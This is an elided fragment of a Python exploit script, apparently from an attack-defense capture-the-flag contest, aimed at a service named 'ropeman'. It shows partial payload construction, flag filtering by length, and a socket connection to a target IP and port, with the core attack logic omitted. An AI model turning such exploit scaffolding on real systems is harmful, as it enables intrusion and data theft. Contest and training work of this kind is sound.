...
def ropeman_exploit(ip, port):
    ...
    #payld += ("%s *" % flag_id)[: 0x3c - len(payld) - 2] + '*\0'
    ...
    flag = ""
    for f in flags:
        if(len(f) >= 20 and len(f) < 24):
        #print("%s len: %d" % (f, len(f)))
            flag = flag + f  + "\n"
    return flag[:-1]


def ropeman_exploit_id(ip, port, flag_id):
    # Open connection
    sock = socket.create_connection((ip, port))
    conn = fdpexpect.fdspawn(sock.fileno(), timeout=3)
